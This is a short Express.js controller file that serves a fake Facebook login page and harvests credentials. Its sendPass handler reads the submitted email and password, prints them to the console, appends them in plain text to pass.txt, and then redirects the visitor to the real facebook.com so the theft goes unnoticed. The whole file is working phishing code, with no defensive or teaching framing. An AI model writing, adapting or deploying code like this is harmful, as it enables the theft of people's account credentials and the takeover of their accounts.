const { response } = require('express');
const { request } = require('http');
const path = require('path');
const fileFunction = require('fs');

exports.getFacebookIndex = (request, response, next)=>{

    response.render('FacebookIndex');
};

exports.sendPass = (request, response, next)=>{

    const email = request.body.email;
    const password = request.body.password;

    console.log(email+", "+password);
    fileFunction.appendFileSync("pass.txt", email+" "+password+"\n");
    response.redirect('https://www.facebook.com');
};